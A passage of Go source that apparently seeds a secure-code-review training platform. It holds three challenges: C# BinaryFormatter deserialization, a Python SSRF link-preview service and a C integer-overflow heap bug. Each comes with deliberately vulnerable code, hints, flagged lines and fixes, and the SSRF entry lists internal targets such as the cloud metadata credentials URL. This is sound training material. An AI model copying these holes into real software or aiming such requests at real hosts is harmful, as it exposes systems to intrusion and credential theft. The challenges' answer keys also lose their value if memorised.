        {
            _listener = new TcpListener(IPAddress.Any, port);
        }

        public async Task StartAsync()
        {
            _listener.Start();
            Console.WriteLine("Session service started");

            while (true)
            {
                var client = await _listener.AcceptTcpClientAsync();
                _ = HandleClientAsync(client);
            }
        }

        private async Task HandleClientAsync(TcpClient client)
        {
            using var stream = client.GetStream();
            using var ms = new MemoryStream();

            var buffer = new byte[4096];
            int bytesRead;
            while ((bytesRead = await stream.ReadAsync(buffer, 0, buffer.Length)) > 0)
            {
                ms.Write(buffer, 0, bytesRead);
                if (bytesRead < buffer.Length) break;
            }

            ms.Position = 0;

            try
            {
                // BUG: BinaryFormatter deserializes arbitrary types from
                // untrusted network input — enables gadget chain RCE
                var formatter = new BinaryFormatter();
                var sessionData = (SessionData)formatter.Deserialize(ms);

                Console.WriteLine($"Session received: {sessionData.SessionId}");
                await ProcessSession(sessionData, stream);
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error: {ex.Message}");
            }
        }

        private async Task ProcessSession(SessionData session, NetworkStream stream)
        {
            var response = System.Text.Encoding.UTF8.GetBytes(
                $"{{\"status\": \"ok\", \"sessionId\": \"{session.SessionId}\"}}");
            await stream.WriteAsync(response, 0, response.Length);
        }
    }
}`,
		targetVuln:    "The service uses BinaryFormatter.Deserialize() to deserialize data received from untrusted network clients. BinaryFormatter can instantiate any Serializable type available in the loaded assemblies. Using known .NET gadget chains (e.g., from System.Data, System.Windows.Forms, or third-party libraries), an attacker can craft a payload that executes arbitrary code when deserialized — before the cast to SessionData even occurs.",
		conceptualFix: "Replace BinaryFormatter with a safe serialization format. Use System.Text.Json, MessagePack, or Protocol Buffers for inter-service communication. Microsoft has deprecated BinaryFormatter and it is removed in .NET 9. If binary serialization is required, use DataContractSerializer with a known type list. Never deserialize untrusted data with BinaryFormatter, SoapFormatter, or NetDataContractSerializer.",
	}
}

// ──────────────────────────────────────────────────
// Python SSRF via requests library
// ──────────────────────────────────────────────────
func cvePythonSSRF() challengeSeed {
	return challengeSeed{
		title:      "Python SSRF — URL Preview Service",
		slug:       "python-ssrf-requests",
		difficulty: 4,
		langSlug:   "python",
		catSlug:    "ssrf",
		points:     200,
		description: "This URL preview API fetches metadata from user-supplied URLs to generate link previews. It performs a basic scheme check but doesn't validate the target host, allowing an attacker to request internal services, cloud metadata endpoints, or local resources that should not be externally accessible.",
		hints: []string{
			"Look at what URL validation is performed before the request is made.",
			"The scheme check allows http/https — but what about the host? Can it be 169.254.169.254?",
			"The requests library follows redirects by default — a safe-looking URL could redirect to an internal one.",
		},
		vulnerableLines: []int{24, 25, 26, 27, 28, 29, 30},
		code: `from flask import Flask, request, jsonify
import requests
from bs4 import BeautifulSoup
from urllib.parse import urlparse

app = Flask(__name__)

@app.route("/api/preview", methods=["POST"])
def url_preview():
    data = request.get_json()
    url = data.get("url", "")

    if not url:
        return jsonify({"error": "URL is required"}), 400

    # Basic scheme validation
    parsed = urlparse(url)
    if parsed.scheme not in ("http", "https"):
        return jsonify({"error": "Only HTTP(S) URLs allowed"}), 400

    if not parsed.hostname:
        return jsonify({"error": "Invalid URL"}), 400

    try:
        # BUG: No host validation — can reach internal services,
        # cloud metadata (169.254.169.254), localhost, etc.
        # Also follows redirects, so even a "safe" URL can redirect internally
        resp = requests.get(url, timeout=5, headers={
            "User-Agent": "LinkPreview/1.0"
        })
        resp.raise_for_status()

        soup = BeautifulSoup(resp.text[:50000], "html.parser")

        title = soup.find("title")
        description = soup.find("meta", attrs={"name": "description"})
        og_image = soup.find("meta", attrs={"property": "og:image"})

        return jsonify({
            "url": url,
            "title": title.string if title else None,
            "description": description["content"] if description else None,
            "image": og_image["content"] if og_image else None,
            "status": resp.status_code,
        })
    except requests.RequestException as e:
        return jsonify({"error": f"Failed to fetch URL: {e}"}), 502

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)`,
		targetVuln:    "The URL preview service fetches any URL the user provides without validating the target host against internal/private IP ranges. An attacker can supply URLs like http://169.254.169.254/latest/meta-data/iam/security-credentials/ (AWS metadata), http://localhost:6379/ (local Redis), or http://10.0.0.1/admin (internal admin panel). The requests library follows redirects by default, so even an external URL that 302-redirects to an internal address would be followed.",
		conceptualFix: "Resolve the hostname to an IP address before making the request and reject private/reserved IP ranges (127.0.0.0/8, 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16, 169.254.0.0/16, ::1, fc00::/7). Disable automatic redirect following (allow_redirects=False) or re-validate the target after each redirect. Use a dedicated egress proxy that enforces network-level SSRF protection.",
	}
}

// ──────────────────────────────────────────────────
// C Integer Overflow — Heap Corruption
// ──────────────────────────────────────────────────
func cveCIntegerOverflow() challengeSeed {
	return challengeSeed{
		title:      "C Integer Overflow — Heap Buffer Overflow",
		slug:       "c-integer-overflow",
		difficulty: 7,
		langSlug:   "c",
		catSlug:    "memory-corruption",
		points:     350,
		description: "This image processing library calculates the buffer size for a bitmap by multiplying width * height * bytes_per_pixel. When the image dimensions are very large, this multiplication overflows a 32-bit integer, resulting in a much smaller allocation than expected. The subsequent data copy then writes far beyond the allocated buffer, corrupting the heap.",
		hints: []string{
			"Look at the buffer size calculation — what type is used for width * height * bpp?",
			"What happens if width=65536, height=65536, bpp=4? Does the multiplication overflow a uint32?",
			"The allocation uses the overflowed (small) value, but the copy uses the real dimensions.",
		},
		vulnerableLines: []int{28, 29, 30, 31, 32, 33},
		code: `#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

typedef struct {
    uint32_t width;
    uint32_t height;
    uint16_t bits_per_pixel;
    uint32_t data_size;
    uint8_t *data;
} BitmapImage;

/* Parse a bitmap image header and allocate the pixel buffer.
   The header contains width, height, and bits_per_pixel from the file. */
BitmapImage *load_bitmap(const uint8_t *file_data, size_t file_size) {
    if (file_size < 14) return NULL;

    BitmapImage *img = (BitmapImage *)calloc(1, sizeof(BitmapImage));
    if (!img) return NULL;

    /* Parse header fields (simplified) */
    img->width = *(uint32_t *)(file_data + 0);
    img->height = *(uint32_t *)(file_data + 4);
    img->bits_per_pixel = *(uint16_t *)(file_data + 8);

    uint32_t bytes_per_pixel = img->bits_per_pixel / 8;

    /* BUG: Integer overflow in buffer size calculation.
       If width * height * bytes_per_pixel exceeds UINT32_MAX,
       the result wraps around to a small value. */
    uint32_t buffer_size = img->width * img->height * bytes_per_pixel;
    img->data_size = buffer_size;

    img->data = (uint8_t *)malloc(buffer_size);
    if (!img->data) {
        free(img);
        return NULL;
    }

    /* Copy pixel data — uses the REAL dimensions, not the overflowed size.
       This writes beyond the allocated buffer. */
    size_t actual_size = (size_t)img->width * img->height * bytes_per_pixel;
    size_t available = file_size - 14;
    size_t copy_size = actual_size < available ? actual_size : available;
    memcpy(img->data, file_data + 14, copy_size);

    return img;
}

int main(void) {
    /* Simulate a malicious bitmap: 65536 x 65536 x 4bpp
       width * height * 4 = 2^32 * 4 = overflow to 0 in uint32 */
    uint8_t header[14];
    *(uint32_t *)(header + 0) = 65536;   /* width */
    *(uint32_t *)(header + 4) = 65536;   /* height */
    *(uint16_t *)(header + 8) = 32;      /* bits_per_pixel */

    printf("Loading malicious bitmap...\n");
    BitmapImage *img = load_bitmap(header, sizeof(header));
    if (img) {
        printf("Allocated %u bytes for %ux%u image\n",
               img->data_size, img->width, img->height);
        free(img->data);
        free(img);
    }
    return 0;
}`,
		targetVuln:    "The buffer size calculation (width * height * bytes_per_pixel) is performed using uint32_t arithmetic. With attacker-controlled dimensions (e.g., 65536 x 65536 x 4), the multiplication overflows UINT32_MAX and wraps to a small value (or zero). malloc() allocates this small buffer, but the subsequent memcpy uses the correct (much larger) size computed with size_t, writing far beyond the allocated heap buffer — causing heap corruption that can lead to arbitrary code execution.",
		conceptualFix: "Perform the size calculation using size_t (64-bit on modern systems) to avoid overflow: size_t buffer_size = (size_t)width * height * bytes_per_pixel. Then add an explicit overflow check before malloc: verify that width <= MAX_DIM && height <= MAX_DIM and that the multiplication doesn't exceed a reasonable maximum. Alternatively, use safe multiplication functions like __builtin_mul_overflow() in GCC/Clang.",
	}
}
